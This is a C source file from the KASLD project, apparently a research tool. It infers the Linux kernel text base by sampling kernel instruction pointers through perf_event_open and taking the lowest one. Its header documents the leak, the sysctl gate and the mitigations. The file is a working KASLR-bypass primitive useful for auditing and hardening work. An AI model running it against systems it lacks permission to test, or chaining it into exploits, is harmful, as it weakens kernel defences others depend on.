// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Infer kernel base by sampling kernel events and taking the lowest address
//
// Largely based on original code by lizzie:
// https://blog.lizzie.io/kaslr-and-perf.html
//
// Requires:
// - kernel.perf_event_paranoid < 2 (Default on Ubuntu <= 4.4.0 kernels)
//
// Leak primitive:
//   Data leaked:      kernel text virtual addresses (sampled instruction
//   pointers) Kernel subsystem: kernel/events — perf_event_open syscall Data
//   structure:   struct perf_event → sample IP (instruction pointer) Address
//   type:     virtual (kernel text) Method:           exact (perf event
//   sampling) Status:           gated by design (perf_event_paranoid)
//   Access check:     perf_event_open() checks perf_event_paranoid; requires
//                     CAP_PERFMON or CAP_SYS_ADMIN
//   Source:
//   https://elixir.bootlin.com/linux/v6.12/source/kernel/events/core.c
//
// Mitigations:
//   kernel.perf_event_paranoid >= 2 (default on most distros) blocks
//   kernel-space sampling. Bypass requires CAP_PERFMON (v5.8+) or
//   CAP_SYS_ADMIN.
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include <errno.h>
#include <linux/perf_event.h>
#include <poll.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Uses the perf_event_open() syscall to sample kernel instruction "
    "pointers during system calls. Each sample reports a raw kernel "
    "text virtual address. Gated by kernel.perf_event_paranoid: values "
    "below 2 allow kernel profiling. Requires CAP_PERFMON (v5.8+) or "
    "CAP_SYS_ADMIN when paranoid >= 2.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:virtual\n"
           "sysctl:perf_event_paranoid>=2\n"
           "bypass:CAP_PERFMON\n"
           "bypass:CAP_SYS_ADMIN\n");

static int perf_event_open(struct perf_event_attr *attr, pid_t pid, int cpu,
                           int group_fd, unsigned long flags) {
  return syscall(SYS_perf_event_open, attr, pid, cpu, group_fd, flags);
}

/* Multi-page data ring: must be (1 + 2^n) pages. ring_copy() below handles
 * records that straddle the buffer end. */
#define DATA_PAGES 16

/* Target sample count and outer timeout. sample_period below is chosen so a
 * busy syscall child generates hundreds of samples per second, comfortably
 * under the kernel's perf_event_max_sample_rate throttle. */
#define TARGET_SAMPLES 100
#define POLL_MS_PER_ROUND 200
#define MAX_ROUNDS 50

/* Copy `n` bytes out of the ring at byte offset `off`, handling wrap. */
static void ring_copy(const char *ring, size_t ring_size, uint64_t off,
                      void *dst, size_t n) {
  size_t off_in = (size_t)(off % ring_size);
  size_t first = ring_size - off_in;
  if (first >= n) {
    memcpy(dst, ring + off_in, n);
  } else {
    memcpy(dst, ring + off_in, first);
    memcpy((char *)dst + first, ring, n - first);
  }
}

static unsigned long get_kernel_addr_perf(void) {
  kasld_info("trying perf_event_open sampling ...");

  pid_t child = fork();
  if (child == -1) {
    perror("[-] fork");
    return 0;
  }
  if (child == 0) {
    struct utsname self;
    while (1)
      kasld_uname(&self);
    _exit(0);
  }

  /* Attribute setup:
   *  - sample_period 10000 ticks of SW_TASK_CLOCK = roughly one sample per
   *    10 microseconds of task time. This stays well under the default
   *    perf_event_max_sample_rate (~100K/s); periods much smaller than this
   *    trip the throttle and the kernel emits PERF_RECORD_THROTTLE records
   *    in place of PERF_RECORD_SAMPLE.
   *  - precise_ip is unset because PEBS/IBS only applies to hardware events.
   *  - wakeup_events = 1 makes poll() return on every record. */
  struct perf_event_attr event;
  memset(&event, 0, sizeof(event));
  event.type = PERF_TYPE_SOFTWARE;
  event.config = PERF_COUNT_SW_TASK_CLOCK;
  event.size = sizeof(event);
  event.disabled = 1;
  event.exclude_user = 1;
  event.exclude_hv = 1;
  event.sample_type = PERF_SAMPLE_IP;
  event.sample_period = 10000;
  event.wakeup_events = 1;

  int fd = perf_event_open(&event, child, -1, -1, 0);
  if (fd < 0) {
    int e = errno;
    kill(child, SIGKILL);
    waitpid(child, NULL, 0);
    errno = e;
    perror("[-] perf_event_open");
    return 0;
  }

  long page_size = sysconf(_SC_PAGESIZE);
  if (page_size <= 0) {
    close(fd);
    kill(child, SIGKILL);
    waitpid(child, NULL, 0);
    return 0;
  }
  size_t ring_size = (size_t)page_size * DATA_PAGES;
  size_t map_size = (size_t)page_size + ring_size;

  void *base = mmap(NULL, map_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (base == MAP_FAILED) {
    perror("[-] mmap");
    close(fd);
    kill(child, SIGKILL);
    waitpid(child, NULL, 0);
    return 0;
  }

  if (ioctl(fd, PERF_EVENT_IOC_ENABLE, 0) < 0) {
    perror("[-] PERF_EVENT_IOC_ENABLE");
    munmap(base, map_size);
    close(fd);
    kill(child, SIGKILL);
    waitpid(child, NULL, 0);
    return 0;
  }

  struct perf_event_mmap_page *meta = base;
  const char *ring = (const char *)base + page_size;

  size_t num_samples = 0;
  unsigned long min_addr = ~0UL;
  struct pollfd pfd = {.fd = fd, .events = POLLIN};

  for (int round = 0; round < MAX_ROUNDS && num_samples < TARGET_SAMPLES;
       round++) {
    if (poll(&pfd, 1, POLL_MS_PER_ROUND) <= 0)
      break;

    /* Volatile read of meta->data_head + explicit ACQUIRE fence, rather
     * than __atomic_load_n on the u64: on 32-bit arches the latter emits a
     * libatomic call (__atomic_load_8) that musl does not provide. The data
     * value is monotonic so a torn read on 32-bit is bounded — at worst we
     * read a value larger than the real head and the inner-loop bounds
     * checks reject the partial record. The volatile pointer matches the
     * struct field's exact type (__u64) so strict-aliasing rules hold. */
    uint64_t head = *(volatile __u64 *)&meta->data_head;
    __atomic_thread_fence(__ATOMIC_ACQUIRE);
    uint64_t tail = meta->data_tail;

    while (tail < head) {
      struct perf_event_header header;
      if (head - tail < sizeof(header))
        break;
      ring_copy(ring, ring_size, tail, &header, sizeof(header));
      if (header.size < sizeof(header) || header.size > 1024)
        break;
      if (head - tail < header.size)
        break;

      if (header.type == PERF_RECORD_SAMPLE) {
        /* Record layout for sample_type=PERF_SAMPLE_IP:
         *   { struct perf_event_header header; u64 ip; } */
        if (header.size >= sizeof(header) + 8) {
          uint64_t ip;
          ring_copy(ring, ring_size, tail + sizeof(header), &ip, 8);
          if (ip < min_addr)
            min_addr = (unsigned long)ip;
          num_samples++;
        }
      }
      /* PERF_RECORD_THROTTLE / UNTHROTTLE / LOST and anything else: skip. */
      tail += header.size;
    }

    __atomic_thread_fence(__ATOMIC_RELEASE);
    *(volatile __u64 *)&meta->data_tail = tail;
  }

  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  munmap(base, map_size);
  close(fd);
  kill(child, SIGKILL);
  waitpid(child, NULL, 0);

  if (kasld_addr_is_kernel_text(min_addr))
    return min_addr;

  return 0;
}

int main(void) {
  unsigned long addr = get_kernel_addr_perf();
  if (!addr) {
    kasld_err("no kernel address found via perf_event_open");
    return 0;
  }

  /* The lowest sampled IP sits at image_base + offset (offset >= 0); aligning
   * it down to the KASLR granule yields the kernel text BASE estimate, so it
   * reports a base claim (POS_BASE) and leaves reconciliation to the engine.
   * CONF_DERIVED, not CONF_PARSED: the raw IP is parsed-certain, but concluding
   * the aligned slot IS the base is a derived inference, so a parsed
   * ground-truth base still overrides it. kasld_floor_text_base preserves the
   * sub-alignment residue so the value stays valid on every arch (a plain `&
   * -KASLR_VIRT_ALIGN` would drop below the base on riscv64/arm32). */
  unsigned long emit_addr = kasld_floor_text_base(addr);
  kasld_info("lowest leaked address: %lx  kernel base (aligned): %lx", addr,
             emit_addr);
  kasld_result_base(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, emit_addr, NULL,
                    CONF_DERIVED);

  return 0;
}
